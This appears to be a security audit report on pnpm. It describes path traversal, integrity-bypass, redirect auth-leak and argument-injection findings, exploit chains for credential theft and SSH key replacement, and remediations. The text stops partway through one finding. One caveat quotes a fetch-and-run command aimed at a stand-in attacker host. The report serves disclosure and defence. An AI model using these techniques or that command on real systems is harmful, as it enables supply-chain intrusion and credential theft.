# Security Audit Report: pnpm

**Audit Firm:** AutoFyn SignalPilot
**Methodology:** Automated analysis with manual validation against source and PoCs
**Target:** pnpm (https://github.com/pnpm/pnpm)
**Repository:** `pnpm`
**Commit Reviewed:** `976504f`
**Date:** 2026-05-22
**Status:** 4 report candidates + 3 additional hardening observations

---

## Evidence Types

All findings in this report are classified into one of the following evidence tiers:

| Tier | Definition |
|------|------------|
| **Direct pnpm Exploit** | PoC executed against pnpm's own source-built binary with a local test registry |
| **Direct pnpm Exploit + Attacker Infrastructure** | PoC executed with attacker-controlled auxiliary services (redirect server, exfil server, capture endpoint) |
| **Source-Confirmed / Partial Live** | Vulnerable code path confirmed by source review; PoC demonstrates precondition but full attack requires environment conditions not reproducible in test (e.g., MITM, non-default git config) |

---

## Findings Summary

| ID | Title | Severity | CVSS v3.1 | CWE | Evidence Tier |
|----|-------|----------|-----------|-----|---------------|
| PNPM-001 | Integrity Check Bypass via Missing Lockfile Integrity Field | Medium | 6.8 | CWE-354 | Direct pnpm Exploit + Attacker Infrastructure |
| PNPM-002 | Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking) | Medium | 5.9 | CWE-269 | Direct pnpm Exploit + Attacker Infrastructure |
| PNPM-003 | Auth Token Leakage on HTTP Redirect (Same Host) | Medium | 5.9 | CWE-522 | Direct pnpm Exploit + Attacker Infrastructure |
| PNPM-004 | Arbitrary File Write/Delete via Malicious Patch File (Path Traversal) | High | 7.3 | CWE-22 | Direct pnpm Exploit |
| PNPM-005 | Git Fetch `--upload-pack` Argument Injection via `resolution.commit` | Medium | 6.4 | CWE-88 | Source-Confirmed / Partial Live |
| PNPM-006 | Lockfile Resolution Path Traversal (Directory and Tarball Fetchers) | Medium | 4.5 | CWE-22 | Direct pnpm Exploit + Attacker Infrastructure |
| PNPM-007 | Git ext:: Protocol Injection via Lockfile (Conditional RCE) | Low | 2.6 | CWE-20 | Source-Confirmed / Partial Live |

---

## Exploit Chains and Impact Demonstrations

### Chain Evidence Matrix

| Chain | Severity | Vulnerabilities | Evidence | Script |
|-------|----------|-----------------|----------|--------|
| CHAIN-1 | Demonstration | PNPM-001 + PNPM-006 | Direct pnpm Exploit + Attacker Infrastructure | `exploits/chain1_lockfile_credential_theft/exploit.sh` |
| CHAIN-2 | Medium | PNPM-004 (write + delete) | Direct pnpm Exploit | `exploits/chain2_patch_ssh_backdoor/exploit.sh` |
| CHAIN-3 | Demonstration | PNPM-002 + PNPM-006 | Direct pnpm Exploit + Attacker Infrastructure | `exploits/chain3_policy_bypass_theft/exploit.sh` |

CHAIN-2 is the strongest chain because it exercises one root cause: patch paths are not contained to the patched package directory. CHAIN-1 and CHAIN-3 are retained as impact demonstrations, but they rely on PNPM-006, whose incremental security impact is limited because exploitation requires modifying both `package.json` and the lockfile to request local `file:` content.

---

### CHAIN-1: Lockfile Poisoning to Credential Theft Pipeline

**Severity:** Demonstration
**Vulnerabilities:** PNPM-001 (Integrity Check Bypass) + PNPM-006 (Lockfile Resolution Path Traversal -- Directory Fetcher)
**Evidence Tier:** Direct pnpm Exploit + Attacker Infrastructure (uses verdaccio as attacker registry plus exfil capture server)
**Exploit Script:** `exploits/chain1_lockfile_credential_theft/exploit.sh`

#### Attack Flow

1. **PNPM-006 -- Directory traversal redirect:** The resolution for package `chain1-data` is changed from a registry tarball to a directory type with a path traversal: `{directory: ../../../../../../tmp/chain1_secrets, type: directory}`. The lockfile's `packages:` and `snapshots:` entry keys and the `importers:` version reference are updated to match. When pnpm installs, the directory fetcher at `directory-fetcher/src/index.ts:30` resolves `resolution.directory` against the project root without any bounds check, reads all files from the victim's secrets directory (`id_rsa`, `credentials.json`), and hardlinks them into `node_modules/chain1-data/`.

2. **PNPM-001 -- Integrity removal on a tampered package:** The resolution for package `chain1-exfil` has its `integrity:` field stripped, leaving only the `tarball:` URL pointing at the registry. The attacker has meanwhile unpublished and republished `chain1-exfil@1.0.0` with a malicious `postinstall` script (`exfil.js`). With `integrity: undefined`, the worker at `worker/src/start.ts:190` skips hash verification and installs the tampered package silently.

3. **Exfiltration:** The `postinstall` in the tampered `chain1-exfil` package uses `process.env.INIT_CWD` to locate `node_modules/chain1-data/` -- which now contains the stolen secrets from step 1. It reads `id_rsa` and `credentials.json` and sends them via HTTP POST to an attacker-controlled capture server.

#### Confirmed Output

```
CHAIN-1 PASS -- credentials exfiltrated via lockfile poisoning pipeline
```

#### Component Vulnerabilities

- **PNPM-001** (Medium, 6.8): Tampered package installs without integrity check when the `integrity:` field is removed from the lockfile resolution.
- **PNPM-006** (Medium, 4.5): Directory fetcher resolves `resolution.directory` from the lockfile without bounds checking, reading arbitrary directories into `node_modules/`.

#### Combined Impact

Credential theft from a single `pnpm install` in the demonstrated environment. This chain requires lockfile + `package.json` modification plus registry-side package substitution. Since the `package.json` change already requests local `file:` content, the chain is best understood as a defense-in-depth demonstration rather than a distinct exploit path.

---

### CHAIN-2: Patch File SSH Backdoor

**Severity:** Medium
**Vulnerabilities:** PNPM-004 (Arbitrary File Write/Delete via Patch -- both write and delete variants)
**Evidence Tier:** Direct pnpm Exploit (patch applied directly, no external infrastructure)
**Exploit Script:** `exploits/chain2_patch_ssh_backdoor/exploit.sh`

#### Attack Flow

1. **PNPM-004 delete variant -- Delete existing authorized_keys:** The first diff block uses `deleted file mode 100644` with a path that traverses out of the package directory using 10 `../` segments: `../../../../../../../../../../tmp/chain2_home/.ssh/authorized_keys`. The `executeEffects` function in `apply.js` calls `fs.unlinkSync(eff.path)` with this unsanitized path, deleting the victim's SSH `authorized_keys` file.

2. **PNPM-004 write variant -- Write attacker's key:** The second diff block uses `new file mode 100644` targeting the same path. The `executeEffects` function calls `fs.ensureDirSync(dirname(eff.path))` then `fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })` with the attacker's SSH public key as content. Since the patch parser processes effects in order, the deletion runs first, then the creation -- resulting in a clean replacement.

3. The victim runs `pnpm install` to pick up a dependency update. No error is shown. Their `authorized_keys` now contains only the attacker's key.

#### Confirmed Output

```
CHAIN-2 PASS -- SSH authorized_keys replaced with attacker public key via patch traversal
```

#### Component Vulnerabilities

- **PNPM-004** (High, 7.3): Both the file deletion (`fs.unlinkSync`) and file creation (`fs.writeFileSync`) effects use unsanitized paths from patch `diff --git` headers, enabling arbitrary file write and delete via path traversal.

#### Combined Impact

Potential persistent SSH access to a machine that runs `pnpm install` with the malicious patch, if the target SSH path is writable by the installing user. The attack requires a malicious `.patch` file and `pnpm-workspace.yaml` change to be accepted into the project. This is the strongest chain in the report because both steps exercise the same missing containment check rather than combining unrelated weak preconditions.

---

### CHAIN-3: Security Policy Bypass to PATH Hijack to Credential Theft

**Severity:** Demonstration
**Vulnerabilities:** PNPM-002 (Bin Linking Bypasses allowBuild Policy) + PNPM-006 (Lockfile Resolution Path Traversal -- Directory Fetcher)
**Evidence Tier:** Direct pnpm Exploit + Attacker Infrastructure (uses verdaccio as attacker registry)
**Exploit Script:** `exploits/chain3_policy_bypass_theft/exploit.sh`

#### Attack Flow

1. **Developer explicitly blocks chain3-shadow:** The developer adds `allowBuilds: {chain3-shadow: false}` to `pnpm-workspace.yaml`. This correctly prevents chain3-shadow's `postinstall` script from running.

2. **PNPM-002 -- Bin entries bypass the allowBuilds block:** Despite the block, chain3-shadow declares `"bin": {"node": "./payload.sh"}` in its `package.json`. In `building/during-install/src/index.ts`, `linkBinsOfDependencies()` (line 176) executes unconditionally BEFORE `runPostinstallHooks()` (line 187), and the `ignoreScripts` flag set by `allowBuilds: false` only gates the postinstall -- not bin linking. The malicious `node` binary is linked into chain3-runner's virtual store `node_modules/.bin/` before any lifecycle script executes.

3. **PNPM-006 -- Lockfile tampers chain3-secrets resolution to read secrets from disk:** The lockfile's `resolution:` entry for `chain3-secrets` is changed from a registry tarball to a directory type: `{directory: ../../../../../../tmp/chain3_target_secrets, type: directory}`. When pnpm installs, the directory fetcher reads all files from the victim's secrets directory into `node_modules/chain3-secrets/`.

4. **Execution -- trusted package's postinstall triggers the attack:** `chain3-runner` is explicitly allowed and has a postinstall that invokes `node`. The `extendPath` function prepends the virtual store's `node_modules/.bin/` to PATH. The `node` command resolves to chain3-shadow's `payload.sh` (linked in step 2). The payload reads secrets from `node_modules/chain3-secrets/` and copies them to an exfiltration location, then `exec`s the real `node` binary so chain3-runner's postinstall completes normally. The attack is not visible in the install output.

#### Confirmed Output

```
CHAIN-3 PASS -- credentials stolen despite allowBuilds block via bin shadow + directory traversal
```

#### Component Vulnerabilities

- **PNPM-002** (Medium, 5.9): `linkBinsOfDependencies()` runs unconditionally before the `ignoreScripts` check. A blocked package's bin entries are still linked into its parent's PATH.
- **PNPM-006** (Medium, 4.5): `directory-fetcher/src/index.ts:30` resolves `resolution.directory` from the lockfile via `path.resolve` with no containment check.

#### Combined Impact

Credential theft in the demonstrated environment despite the developer blocking one package via `allowBuilds`. This chain depends on PNPM-006, which requires modifying both `package.json` and the lockfile. The useful takeaway is narrower: `allowBuilds` does not prevent a blocked package's bins from being linked, so a blocked package can still influence PATH if another script invokes a shadowed command name.

---

## Vulnerability Details

---

### PNPM-001: Integrity Check Bypass via Missing Lockfile Integrity Field

**Severity:** Medium -- 6.8 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N)
**CWE:** CWE-354 (Improper Validation of Integrity Check Value)
**Proof of Concept:** `exploits/vuln1_integrity_bypass/exploit.sh`

#### Affected Code

| File | Lines | Role |
|------|-------|------|
| `lockfile/types/src/index.ts` | 89-107 | `TarballResolution.integrity` is optional |
| `lockfile/utils/src/pkgSnapshotToResolution.ts` | 44-54 | Resolution reconstruction passes `integrity: undefined` |
| `fetching/tarball-fetcher/src/index.ts` | 94 | `resolution.integrity` forwarded to downloader |
| `fetching/tarball-fetcher/src/remoteTarballFetcher.ts` | 214 | Undefined integrity passed to worker message |
| `worker/src/start.ts` | 189-204 | **Vulnerable:** `if (integrity)` skips check when undefined |
| `worker/src/start.ts` | 232 | Computes hash of unverified content and stores it |

#### Description

The tarball extraction worker verifies the downloaded package tarball against a hash only when the `integrity` field is present in the `TarballExtractMessage`. The TypeScript type `TarballResolution` declares `integrity` as optional (`integrity?: string`). When a lockfile entry's `resolution` block omits the `integrity` field, the full verification chain propagates `integrity: undefined` to the worker, and the `if (integrity)` guard at `worker/src/start.ts:190` evaluates to false -- skipping hash verification entirely. The worker then computes a new hash of whatever content it received and stores it as if it were legitimate.

#### Vulnerable Code

```typescript
// worker/src/start.ts:189-204 (vulnerable)
function addTarballToStore ({ buffer, storeDir, integrity, ... }: TarballExtractMessage) {
  if (integrity) {           // false when integrity is undefined -- no check performed
    const { algorithm, hexDigest } = parseIntegrity(integrity)
    const calculatedHash = crypto.hash(algorithm, buffer, 'hex')
    if (calculatedHash !== hexDigest) {
      return { status: 'error', error: { type: 'integrity_validation_failed', ... } }
    }
  }
  // ... installs whatever content was downloaded
  return {
    status: 'success',
    value: { integrity: integrity ?? calcIntegrity(buffer) },  // stores attacker hash
  }
}
```

#### Attack Scenario

1. Attacker gains write access to the project's `pnpm-lock.yaml` (pull request, compromised CI, compromised developer machine, or direct repo access).
2. Attacker edits the target package's resolution entry to remove the `integrity:` field while keeping the `tarball:` URL pointing to a registry they control.
3. Attacker replaces the package in the registry with malicious content (same name, same version, different content -- feasible via unpublish+republish, DNS hijack, or compromised registry mirror).
4. Developer or CI runs `pnpm install --frozen-lockfile`. The flag prevents lockfile changes but does NOT enforce integrity checking.
5. pnpm downloads the malicious tarball and installs it without any integrity error or warning.
6. The attacker's hash is stored in the content-addressable store. Subsequent installs from cache are also compromised.

#### Proof of Concept

```bash
# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
bash autofyn_audit/exploits/vuln1_integrity_bypass/exploit.sh
# Expected: PASS -- tampered package installed silently
```

The exploit publishes a legitimate package, generates a lockfile, republishes a tampered version (same name/version, different content including `PWNED.txt`), strips the `integrity:` field from the lockfile, clears the store, and re-runs install with `--frozen-lockfile`. The tampered content is installed without any error.

#### Impact

Supply chain compromise in environments where an attacker can both alter the lockfile and cause the referenced registry URL to serve altered package content. The `--frozen-lockfile` flag does not fail closed when the integrity field is missing, so the install can accept the tarball returned by the registry URL without comparing it to a lockfile-pinned hash.

#### Caveats

- **Precondition:** The attacker must be able to modify the lockfile AND serve a tampered tarball from the registry URL. Lockfile modification alone is not sufficient -- the tarball at the referenced URL must also differ from the original.
- **npm/yarn comparison:** npm's `npm ci` requires integrity fields to be present in `package-lock.json` and fails if they are missing. Yarn Berry also enforces integrity by default. pnpm's behavior of silently skipping verification when the field is absent is a pnpm-specific gap.

#### Remediation

1. **Require integrity for tarball resolutions:** When a `tarball:` URL is present in the resolution, treat a missing `integrity` field as an error rather than silently skipping verification.
2. **Harden the worker guard:** Change `if (integrity)` to an assertion that rejects the message if integrity is absent for non-local packages.
3. **Lockfile validation:** Warn or refuse to install if `pnpm-lock.yaml` contains package resolutions without an integrity hash.
4. **Consider `--frozen-lockfile` enforcement:** When `--frozen-lockfile` is active, fail hard on any lockfile entry that lacks an integrity field for remote packages.

---

### PNPM-002: Bin Linking Bypasses allowBuild Security Policy (PATH Hijacking)

**Severity:** Medium -- 5.9 (AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N)
**CWE:** CWE-269 (Improper Privilege Management)
**Proof of Concept:** `exploits/vuln5_bin_shadow/exploit.sh`

#### Affected Code

| File | Lines | Role |
|------|-------|------|
| `installing/deps-installer/src/install/index.ts` | 1651 | `linkAllBins()` called for ALL `newDepPaths` with no `allowBuild` check |
| `installing/deps-installer/src/install/index.ts` | 1660-1698 | Project-level bin linking includes all direct deps regardless of `allowBuild` status |
| `building/during-install/src/index.ts` | 90-108 | `allowBuild` sets `ignoreScripts = true` to block lifecycle scripts -- does NOT block bin linking |
| `building/during-install/src/index.ts` | 176 | `linkBinsOfDependencies()` called unconditionally before `ignoreScripts` gates `runPostinstallHooks` |
| `@pnpm/npm-lifecycle` (vendored) | `extendPath()` | Prepends `node_modules/.bin` to PATH for all lifecycle scripts (standard npm behavior) |

#### Description

When a package is blocked by `allowBuilds: { pkg: false }` in `pnpm-workspace.yaml`, pnpm correctly sets `ignoreScripts = true` for that package (lines 90-108 of `building/during-install/src/index.ts`), which prevents its `postinstall`, `preinstall`, and `install` lifecycle scripts from running. However, bin entries are still linked into `node_modules/.bin/` by two independent code paths that are unaware of `allowBuild` status:

1. **Per-package bin linking** (`during-install` line 176): `linkBinsOfDependencies()` is called unconditionally in `buildDependency` regardless of `ignoreScripts` -- it runs before the `ignoreScripts` check gates `runPostinstallHooks`.
2. **Project-level bin linking** (`deps-installer` line 1651 and 1679): `linkAllBins()` and `linkBinsOfPackages()` iterate all dependency graph nodes and all direct deps without any `allowBuild` check.

A malicious package can declare `bin` entries that shadow common system commands (`node`, `npm`, `git`, `curl`, `sh`). Even when explicitly blocked by security policy, these bins can appear in PATH for lifecycle or project script execution. The bin is only dangerous if some later script or user command invokes the shadowed command name.

#### Vulnerable Code

```typescript
// building/during-install/src/index.ts:88-113 (allowBuild sets ignoreScripts only)
const allowed = allowBuild(node.name, node.version)
switch (allowed) {
  case false:
    ignoreScripts = true  // only blocks lifecycle scripts
    break
  // ... bin linking at line 176 is NOT conditional on ignoreScripts
}
return buildDependency(depPath, depGraph, { ...buildDepOpts, ignoreScripts })

// buildDependency line 176: always runs regardless of ignoreScripts
await linkBinsOfDependencies(depNode, depGraph, opts)
// ... only this is gated on ignoreScripts:
const hasSideEffects = !opts.ignoreScripts && await runPostinstallHooks(...)
```

#### Attack Scenario

1. Attacker publishes a package with `"bin": { "node": "./malicious.js" }` and a postinstall script.
2. Victim adds it as a dependency and explicitly blocks it via `allowBuilds: { attacker-pkg: false }` in `pnpm-workspace.yaml`, believing this prevents any code execution.
3. `pnpm install` blocks the package's postinstall script -- the security policy appears to work.
4. However, `node_modules/.bin/node` is silently linked to the attacker's `malicious.js`.
5. Any project script or allowed package lifecycle script that invokes the shadowed command name may execute the attacker's binary instead of the intended executable.

#### Proof of Concept

```bash
# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
bash autofyn_audit/exploits/vuln5_bin_shadow/exploit.sh
# Expected: PASS -- postinstall blocked, but node_modules/.bin/curl linked to evil.sh
```

The exploit publishes `evil-shadow@1.0.0` with `"bin": { "curl": "./evil.sh" }` and a `postinstall` that creates `/tmp/vuln5_postinstall_ran`. The test project blocks it via `allowBuilds: { evil-shadow: false }`. After install, the postinstall marker is absent (correctly blocked) but `node_modules/.bin/curl` points to `evil.sh` (policy bypass). Running the linked bin creates `/tmp/vuln5_bin_executed`, confirming the hijack.

#### Impact

PATH hijacking from a package that is supposedly blocked by security policy. Users and security tooling that rely on `allowBuilds` to sandbox a suspicious package have an incomplete picture: the package's lifecycle scripts are blocked, but its declared executables may still be linked and may execute if another script invokes the shadowed command. This is a gap in the `allowBuilds` feature's coverage.

#### Caveats

- **Bin linking is standard npm behavior.** npm and yarn also link bin entries unconditionally. pnpm's `allowBuilds` is a pnpm-specific security feature, so the gap between "scripts blocked" and "bins still linked" is pnpm-specific.
- **Requires a trigger.** The shadowed binary only executes if something else on PATH invokes the shadowed command name. If no lifecycle script or user command calls `node` (or whatever is shadowed), the linked bin is inert.

#### Remediation

1. **Skip bin linking for blocked packages:** In both `linkAllBins` (called at `deps-installer` line 1651) and the project-level `linkBinsOfPackages` (line 1679), check `allowBuild` status and skip packages where `allowBuild(name, version) === false`.
2. **Alternatively, move bin linking after the `ignoreScripts` check** in `buildDependency` so that `ignoreScripts = true` gates both lifecycle scripts and bin linking.
3. **Document the limitation:** Until fixed, document that `allowBuilds: false` blocks scripts but not bin linking, so users understand the incomplete protection.

---

### PNPM-003: Auth Token Leakage on HTTP Redirect (Same Host)

**Severity:** Medium -- 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)
**CWE:** CWE-522 (Insufficiently Protected Credentials)
**Proof of Concept:** `exploits/vuln2_auth_downgrade/exploit.sh`

#### Affected Code

| File | Lines | Role |
|------|-------|------|
| `network/fetch/src/fetchFromRegistry.ts` | 90-122 | Redirect loop with auth stripping logic |
| Line 92 | | `const originalHost = urlObject.host` -- captures host without protocol |
| Line 120 | | **Vulnerable:** `if (!headers['authorization'] \|\| originalHost === urlObject.host) continue` |

#### Description

pnpm's redirect-following code is intended to strip the `Authorization` header when following redirects to a different host, preventing credential leakage. The guard condition at line 120 checks `originalHost === urlObject.host`. The `URL.host` property returns only the hostname and port, not the protocol. Consequently, a redirect from `https://registry.example.com/pkg` to `http://registry.example.com/pkg` (HTTPS-to-HTTP downgrade on the same hostname) passes the host equality check, and the auth header is NOT stripped. The token is then sent in plaintext over HTTP where it can be captured by any network observer.

#### Vulnerable Code

```typescript
// network/fetch/src/fetchFromRegistry.ts:90-122
let urlObject = new URL(url)
const originalHost = urlObject.host  // e.g., "registry.example.com" (no protocol)
while (true) {
  const response = await fetchWithDispatcher(urlObject, { ... })
  if (!isRedirect(response.status) || redirects >= MAX_FOLLOWED_REDIRECTS) {
    return response
  }
  redirects++
  urlObject = resolveRedirectUrl(response, urlObject)
  // Bug: host check ignores protocol. HTTPS -> HTTP on same host passes.
  if (!headers['authorization'] || originalHost === urlObject.host) continue
  delete headers.authorization  // This line is NOT reached on same-host redirect
}
```

#### Attack Scenario

1. Attacker compromises a registry server or performs a MITM attack on a developer's connection to a private npm registry.
2. The compromised server returns a 302 redirect from `https://registry.example.com/@company/pkg` to `http://registry.example.com/@company/pkg` (same hostname, HTTP).
3. pnpm follows the redirect. The host comparison (`registry.example.com === registry.example.com`) is true, so the auth header is preserved.
4. `Authorization: Bearer <private-token>` is transmitted over plaintext HTTP.
5. Attacker's network position captures the token.
6. Attacker authenticates to the registry using the stolen token to access private packages, exfiltrate package source code, or publish malicious versions.

#### Proof of Concept

```bash
bash autofyn_audit/exploits/vuln2_auth_downgrade/exploit.sh
# Expected: PASS -- auth token found in captured headers after redirect
```

The exploit runs a single HTTP server on port 4880 that returns a 302 redirect to a `/capture/` path on the same host. pnpm follows the redirect and the auth token is captured by the same server at the `/capture/` path, demonstrating that host-matching preserves auth headers across redirects regardless of other URL components.

> **PoC limitation:** The exploit demonstrates the precondition (auth headers survive same-host redirects) using HTTP-to-HTTP redirects. The full vulnerability (HTTPS-to-HTTP protocol downgrade) requires TLS infrastructure not practical in a test environment. The source code analysis at `fetchFromRegistry.ts:120` confirms the code only checks `host`, not protocol -- any same-host redirect preserves auth, including HTTPS-to-HTTP downgrades.

#### Impact

Confidentiality impact: private registry auth tokens can be stolen via a compromised registry or MITM attack. The attack requires a network-level position or registry compromise (AC:H), but the impact is significant: full access to the victim's private package registry, including all private packages and the ability to publish.

#### Caveats

- **Requires MITM or compromised registry:** The attacker must control the network path or the registry server to inject the HTTPS-to-HTTP redirect. This is a high bar in practice.
- **Other package managers:** npm has historically had similar redirect auth-stripping issues (fixed in later versions). This class of bug is not unique to pnpm, but the specific code path here is pnpm-specific.
- **HSTS mitigation:** If the registry uses HTTP Strict Transport Security (HSTS) and the client enforces it, the browser/HTTP client may refuse the HTTP downgrade. However, Node.js `fetch` does not enforce HSTS by default.

#### Remediation

Compare the full origin (protocol + host + port) rather than just host when deciding whether to preserve auth headers on redirect:

```typescript
// Before (vulnerable)
const originalHost = urlObject.host
// ...
if (!headers['authorization'] || originalHost === urlObject.host) continue

// After (fixed)
const originalOrigin = `${urlObject.protocol}//${urlObject.host}`
// ...
const redirectOrigin = `${urlObject.protocol}//${urlObject.host}`
if (!headers['authorization'] || originalOrigin === redirectOrigin) continue
```

This ensures that any protocol change (HTTPS to HTTP) strips the auth header, even when the hostname is unchanged.

---

### PNPM-004: Arbitrary File Write/Delete via Malicious Patch File (Path Traversal)

**Severity:** High -- 7.3 (AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:H)
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)
**Proof of Concept (write):** `exploits/vuln6_patch_traversal_write/exploit.sh`
**Proof of Concept (delete):** `exploits/vuln7_patch_traversal_delete/exploit.sh`

#### Affected Code

| File | Lines | Role |
|------|-------|------|
| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 88 | `diff --git a/(.*?) b/(.*?)` regex extracts paths with no sanitization |
| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 126, 129 | `--- a/` and `+++ b/` paths sliced from line with no sanitization |
| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/parse.js` | 223-249 | `interpretParsedPatchFile`: file deletion uses `diffLineFromPath`, creation uses `diffLineToPath` as `eff.path` |
| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/apply.js` | 13-22 | `executeEffects` deletion: `fs.unlinkSync(eff.path)` with no path validation; `// TODO: integrity checks` comment |
| `patching/apply-patch/node_modules/@pnpm/patch-package/dist/patch/apply.js` | 35-49 | `executeEffects` creation: `fs.ensureDirSync(dirname(eff.path))` then `fs.writeFileSync(eff.path, ...)` |
| `patching/apply-patch/src/index.ts` | 12-13 | `process.chdir(opts.patchedDir)` sets CWD to installed package dir before effects execute |
| `building/during-install/src/index.ts` | 185 | `applyPatchToDir({ patchedDir: depNode.dir, patchFilePath: ... })` triggered during `pnpm install` |

#### Description

pnpm's patch application pipeline has no path validation. During `pnpm install`, when a `patchedDependencies` entry is present in `pnpm-workspace.yaml`, pnpm reads the referenced `.patch` file and applies it via the embedded `@pnpm/patch-package` library. The patch parser extracts file paths from `diff --git a/(.*?) b/(.*?)` headers and `--- a/PATH` / `+++ b/PATH` lines using simple string operations with no path traversal checks.

Before executing effects, `applyPatchToDir` sets `process.chdir(patchedDir)` where `patchedDir` is the installed package directory deep inside `node_modules/.pnpm/`. A path containing `../../../../../../../../../../tmp/target` in the patch header traverses out of the package directory to an arbitrary absolute path.

**File write variant:** The `executeEffects` function for a "file creation" effect calls `fs.ensureDirSync(dirname(eff.path))` and `fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })` with the unsanitized path, writing attacker-controlled content to any location the process has write access to.

#### Vulnerable Code

```javascript
// apply.js:35-49 (vulnerable -- file creation effect)
case 'file creation': {
  const eff = effect
  fs.ensureDirSync(dirname(eff.path))      // creates dirs along traversal path
  fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })  // writes to arbitrary path
  break
}
```

**File delete variant:** The same root cause applies to file deletion effects. A patch with `deleted file mode 100644` triggers the "file deletion" effect type. The `executeEffects` function calls `fs.unlinkSync(eff.path)` with the unsanitized path. The `// TODO: integrity checks` comment at `apply.js:20` shows that content/path validation is not implemented in this branch.

```javascript
// apply.js:13-22 (vulnerable -- file deletion effect)
case 'file deletion': {
  const eff = effect
  // TODO: integrity checks
  if (!opts.dryRun) {
    fs.unlinkSync(eff.path)   // deletes arbitrary path without validation
  }
  break
}
```

Both variants share the same root cause: the `interpretParsedPatchFile` function at `parse.js:223-249` uses `diffLineFromPath` (from the `diff --git a/` path) for deletion and `diffLineToPath` (from the `diff --git b/` path) for creation as `eff.path`, with no containment check.

#### Attack Scenario

1. Attacker gains the ability to contribute a `.patch` file to a project (pull request, compromised contributor, compromised CI that writes `pnpm-workspace.yaml`).
2. Attacker crafts a patch file with `diff --git` headers whose paths traverse out of the package directory (e.g., targeting `~/.ssh/authorized_keys`).
3. A `new file mode 100644` block writes attacker-controlled content to the target path. A `deleted file mode 100644` block deletes the target file. Both can be combined in a single patch.
4. The `patchedDependencies` entry is committed alongside the patch file.
5. Victim developer or CI pipeline runs `pnpm install`.
6. pnpm applies the malicious patch: `fs.writeFileSync` writes and/or `fs.unlinkSync` deletes files at the traversed paths.

#### Proof of Concept

**Write variant:**
```bash
# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
# Expected: PASS -- /tmp/vuln6_pwned created with content PWNED_BY_MALICIOUS_PATCH
```

The exploit publishes a trivial package, runs an initial `pnpm install` to generate a lockfile, then adds a malicious `.patch` file and `pnpm-workspace.yaml` with `patchedDependencies`. After clearing the store and re-running install, `/tmp/vuln6_pwned` is created with attacker-controlled content.

**Delete variant:**
```bash
# Prerequisites: setup.sh must have been run (verdaccio on localhost:4873)
bash autofyn_audit/exploits/vuln7_patch_traversal_delete/exploit.sh
# Expected: PASS -- /tmp/vuln7_target deleted by malicious patch
```

The exploit publishes a trivial package, runs an initial `pnpm install`, then adds a malicious `.patch` file with a deletion effect. Before the second install, the target file `/tmp/vuln7_target` is created. After install, the file is absent.

#### Impact

Arbitrary file write and delete as the user running `pnpm install`, limited to paths writable by that user. An attacker can target SSH keys, shell configuration files, CI/CD files, or other writable files. The `--frozen-lockfile` flag provides no protection since the patch file path and `pnpm-workspace.yaml` are separate from the lockfile.

#### Caveats

- **Requires a merged PR, not direct commit access.** The attacker submits a PR adding a `.patch` file and a `pnpm-workspace.yaml` modification. A maintainer must merge it. This is PR:L (any contributor), not PR:H (admin). While a PR with a malicious `postinstall` script in `package.json` could achieve similar outcomes, patch files receive far less review scrutiny — the `../` traversal sequences are buried in `diff --git` headers that look like normal patch metadata, unlike a clearly suspicious `"postinstall": "curl evil.com | sh"`.
- **Patch files are opaque to most reviewers.** Unified diff format is dense and tooling-focused. Code review UIs typically don't highlight path traversal in diff headers. The `../` sequences blend into what looks like standard patch formatting, making this vector harder to catch in review than equivalent attacks via `package.json` scripts.
- **npm and yarn do not have a built-in patch mechanism.** The `patch-package` npm module (the upstream of pnpm's vendored fork) has the same vulnerability. This is shared with the `patch-package` ecosystem rather than unique to pnpm.

#### Remediation

1. **Validate paths after resolution:** After parsing patch file paths, resolve them against the package root and reject any path that escapes with `path.resolve` + prefix check: if `!resolvedPath.startsWith(packageRoot)`, throw an error.
2. **Sanitize at parse time:** In `parse.js`, reject any parsed path that contains `..` components before returning the parsed patch object.
3. **Sandbox the CWD:** Rather than using `process.chdir`, resolve all effect paths against the package directory before executing effects, keeping the process CWD stable and making traversal attempts explicit.
4. **Implement the TODO:** The `// TODO: integrity checks` comment at `apply.js:20` should be resolved: verify the file to be deleted matches the expected content from the patch hunk before deleting it, and verify the path is within bounds.

---

### PNPM-005: Git Fetch `--upload-pack` Argument Injection via `resolution.commit`

**Severity:** Medium -- 6.4 (AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:N)
**CWE:** CWE-88 (Improper Neutralization of Argument Delimiters in a Command)
**Proof of Concept:** `exploits/vuln11_git_upload_pack_rce/exploit.sh`

#### Affected Code

| File | Lines | Role |
|------|-------|------|
| `fetching/git-fetcher/src/index.ts` | 33 | `execGit(['fetch', '--depth', '1', 'origin', resolution.commit])` -- no `--` separator |
| `fetching/git-fetcher/src/index.ts` | 37 | `execGit(['checkout', resolution.commit])` -- no `--` separator |
| `fetching/git-fetcher/src/index.ts` | 30 | Shallow condition: `allowedHosts.size > 0 && shouldUseShallow(resolution.repo, allowedHosts)` |
| `fetching/git-fetcher/src/index.ts` | 81-91 | `shouldUseShallow` -- parses URL host, checks against `allowedHosts` set |
| `fetching/git-fetcher/src/index.ts` | 97-101 | `execGit` -- passes args directly to `execa('git', fullArgs, opts)`, no sanitization |
| `lockfile/utils/src/pkgSnapshotToResolution.ts` | 16-21 | Returns resolution verbatim when `type` field is truthy |
| `lockfile/types/src/index.ts` | 120-125 | `GitRepositoryResolution` has `commit: string` with no format constraint |

#### Description

